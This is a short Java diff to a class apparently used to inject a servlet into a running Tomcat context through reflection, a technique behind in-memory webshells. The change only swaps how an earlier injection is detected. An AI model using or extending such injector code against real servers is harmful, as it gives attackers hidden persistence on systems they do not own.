@@ -84,7 +84,7 @@ public class TomcatServletInjector {
 
     @SuppressWarnings("all")
     public void inject(Object context, Object servlet) throws Exception {
-        if (isInjected(context)) {
+        if (invokeMethod(context, "findServletMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
             System.out.println("servlet already injected");
             return;
         }
@@ -105,18 +105,6 @@ public class TomcatServletInjector {
         }
         support56Inject(context, wrapper);
         System.out.println("servlet inject success");
-    }
-
-    @SuppressWarnings("all")
-    public boolean isInjected(Object context) throws Exception {
-        Map<String, String> servletMappings = (Map<String, String>) getFieldValue(context, "servletMappings");
-        Collection<String> values = servletMappings.values();
-        for (String name : values) {
-            if (name.equals(getClassName())) {
-                return true;
-            }
-        }
-        return false;
     }
 
     private void support56Inject(Object context, Object wrapper) throws Exception {
